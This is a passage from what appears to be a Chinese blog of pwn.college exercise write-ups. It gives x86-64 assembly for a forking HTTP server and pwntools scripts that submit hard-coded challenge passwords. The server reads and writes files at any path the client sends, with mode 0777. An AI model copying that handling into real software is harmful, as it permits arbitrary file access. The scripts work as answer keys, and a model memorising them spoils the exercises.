class="hljs-number">3</span>      # close(<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # read(<span class="hljs-number">4</span>,buf,count_bytes)<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, buffer<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">512</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, buffer+<span class="hljs-number">5</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, file_path<br><span class="hljs-symbol">loop_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsi</span>]<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0x20</span><br>    <span class="hljs-keyword">je</span> get_file_path<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span>], <span class="hljs-built_in">al</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">jmp</span> loop_start<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">get_file_path:</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, file_path  # open(<span class="hljs-string">&quot;file_path&quot;</span>, O_WRONLY|O_CREAT, <span class="hljs-number">0777</span>)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">01</span>|<span class="hljs-number">0100</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0x1FF</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span><br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r12</span>, <span class="hljs-number">8</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, buffer<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, content<br><span class="hljs-symbol">loop2_start:</span><br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r12</span><br>    <span class="hljs-keyword">jge</span> get_content<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsi</span>]<br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">r9</span><br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">al</span>, <span class="hljs-string">&#x27;\n&#x27;</span><br>    <span class="hljs-keyword">je</span> get_index <br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">jmp</span> loop2_start<br><span class="hljs-symbol">get_index:</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">r8</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">jmp</span> loop2_start<br><span class="hljs-symbol">get_content:</span><br>    <span class="hljs-keyword">sub</span> <span class="hljs-built_in">r10</span>, <span class="hljs-built_in">r9</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # write(<span class="hljs-number">3</span>, content, content_length)<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, buffer<br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">r9</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">r10</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">syscall</span><br>    <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # close(<span class="hljs-number">3</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # write(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span>, <span class="hljs-number">19</span>) = <span class="hljs-number">19</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>,[<span class="hljs-built_in">rip</span> + ret_normal_msg] <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">19</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">0</span>       # SYS_exit<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">done:</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.section</span> .data<br><span class="hljs-symbol">socket_addr:</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">2</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">0x5000</span><br><span class="hljs-meta">    .4byte</span> <span class="hljs-number">0</span><br><span class="hljs-meta">    .8byte</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">ret_normal_msg:</span><br><span class="hljs-meta">    .ascii</span> <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="hljs-symbol">buffer:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">512</span><br><span class="hljs-symbol">file_path:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">64</span> <br><span class="hljs-symbol">content:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">256</span><br><span class="hljs-symbol">reverse_content:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">256</span><br></code></pre></td></tr></table></figure>

<h4 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h4><p>这道题的关键就是多线程，也就是父进程需要不断地接收新的连接，并fork出子进程来处理这个连接，然后再接收新的连接，再fork出子进程来处理。因此，子进程部分就是level9和level10的结合。额外加一个循环，让父进程不断地accept和fork就好了。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.section</span> .text<br><span class="hljs-symbol">_start:</span>     <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">2</span>      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=<span class="hljs-number">3</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">41</span> <br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # bind(<span class="hljs-number">3</span>, &#123;sa_family=AF_INET, sin_port=htons(<span class="hljs-number">80</span>), sin_addr=inet_addr(<span class="hljs-string">&quot;0.0.0.0&quot;</span>)&#125;, <span class="hljs-number">16</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rip</span>+socket_addr]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">16</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">49</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # listen(<span class="hljs-number">3</span>, <span class="hljs-number">0</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">50</span><br>    <span class="hljs-keyword">syscall</span> <br><span class="hljs-symbol">loop_accept:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # accept(<span class="hljs-number">3</span>, NULL, NULL) = <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">43</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">57</span>     # fork()<br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">rax</span><br>	<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-number">0</span><br>	<span class="hljs-keyword">jne</span> parent_process<br>	<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-number">0</span><br>	<span class="hljs-keyword">je</span> child_process<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">child_process:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # close(<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # read(<span class="hljs-number">4</span>,buf,count_bytes)<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, buffer<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">512</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r15</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [buffer]<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">al</span>, <span class="hljs-string">&#x27;P&#x27;</span><br>    <span class="hljs-keyword">je</span> post_request<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">al</span>, <span class="hljs-string">&#x27;G&#x27;</span><br>    <span class="hljs-keyword">je</span> get_request<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">get_request:</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, buffer+<span class="hljs-number">4</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, file_path_get<br><span class="hljs-symbol">loop_start_get:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsi</span>]<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">al</span>, <span class="hljs-string">&#x27; &#x27;</span><br>    <span class="hljs-keyword">je</span> get_file_path_get<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span>], <span class="hljs-built_in">al</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">jmp</span> loop_start_get<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">get_file_path_get:</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, file_path_get # open<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span><br>    <span class="hljs-keyword">syscall</span><br>    <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>              # read<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">256</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">syscall</span> <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">rax</span><br><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # write(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span>, <span class="hljs-number">19</span>) = <span class="hljs-number">19</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>,[<span class="hljs-built_in">rip</span> + ret_normal_msg] <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">19</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">r8</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">syscall</span><br><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">0</span>       # SYS_exit<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span>    <br><span class="hljs-symbol"></span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">post_request:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, buffer+<span class="hljs-number">5</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, file_path<br><span class="hljs-symbol">loop_start_post:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsi</span>]<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0x20</span><br>    <span class="hljs-keyword">je</span> get_file_path_post<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span>], <span class="hljs-built_in">al</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">jmp</span> loop_start_post<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">get_file_path_post:</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, file_path  # open(<span class="hljs-string">&quot;file_path&quot;</span>, O_WRONLY|O_CREAT, <span class="hljs-number">0777</span>)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">01</span>|<span class="hljs-number">0100</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0x1FF</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span><br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r12</span>, <span class="hljs-number">8</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, buffer<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, content<br><span class="hljs-symbol">loop2_start_post:</span><br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r12</span><br>    <span class="hljs-keyword">jge</span> get_content<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsi</span>]<br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">r9</span><br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">al</span>, <span class="hljs-string">&#x27;\n&#x27;</span><br>    <span class="hljs-keyword">je</span> get_index <br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">jmp</span> loop2_start_post<br><span class="hljs-symbol">get_index:</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">r8</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">jmp</span> loop2_start_post<br><span class="hljs-symbol">get_content:</span><br>    <span class="hljs-keyword">sub</span> <span class="hljs-built_in">r15</span>, <span class="hljs-built_in">r9</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # write(<span class="hljs-number">3</span>, content, content_length)<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, buffer<br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">r9</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">r15</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">syscall</span><br>    <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # close(<span class="hljs-number">3</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # write(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span>, <span class="hljs-number">19</span>) = <span class="hljs-number">19</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>,[<span class="hljs-built_in">rip</span> + ret_normal_msg] <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">19</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">0</span>       # SYS_exit<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">parent_process:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">jmp</span> loop_accept<br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.section</span> .data<br><span class="hljs-symbol">socket_addr:</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">2</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">0x5000</span><br><span class="hljs-meta">    .4byte</span> <span class="hljs-number">0</span><br><span class="hljs-meta">    .8byte</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">ret_normal_msg:</span><br><span class="hljs-meta">    .ascii</span> <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="hljs-symbol">buffer:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">512</span><br><span class="hljs-symbol">file_path:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">64</span> <br><span class="hljs-symbol">file_path_get:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">64</span><br><span class="hljs-symbol">content:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">256</span><br><span class="hljs-symbol">reverse_content:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">256</span><br><br></code></pre></td></tr></table></figure>



<h2 id="Playing-With-Programs"><a href="#Playing-With-Programs" class="headerlink" title="Playing With Programs"></a>Playing With Programs</h2><h3 id="Dealing-with-Data"><a href="#Dealing-with-Data" class="headerlink" title="Dealing with Data"></a>Dealing with Data</h3><h4 id="10-Encoding-Practice"><a href="#10-Encoding-Practice" class="headerlink" title="10. Encoding Practice"></a>10. Encoding Practice</h4><p>pwntools 的API说明：<a target="_blank" rel="noopener" href="https://gist.github.com/anvbis/64907e4f90974c4bdd930baeb705dedf">Pwntools Cheatsheet</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">s</span>):<br>    s = u64(s, endianness=<span class="hljs-string">&#x27;big&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(s)<br>    binary = <span class="hljs-built_in">bin</span>(s).replace(<span class="hljs-string">&#x27;0b&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">return</span> binary<br><br>p = process(<span class="hljs-string">&quot;/challenge/runme&quot;</span>)<br><br>correct_password = <span class="hljs-string">b&quot;\x96\x92\xa9\xd6\xec\x83\xe3\xba&quot;</span><br>correct_password = encode(correct_password)<br><span class="hljs-built_in">print</span>(correct_password)<br>p.write(correct_password)<br><span class="hljs-built_in">print</span>(p.readall())<br></code></pre></td></tr></table></figure>

<h4 id="11-Hex-encoding-Practice"><a href="#11-Hex-encoding-Practice" class="headerlink" title="11. Hex-encoding Practice"></a>11. Hex-encoding Practice</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>correct_password = <span class="hljs-string">b&quot;hveetgwy&quot;</span><br>correct_password = enhex(correct_password)<br><span class="hljs-built_in">print</span>(correct_password)<br></code></pre></td></tr></table></figure>

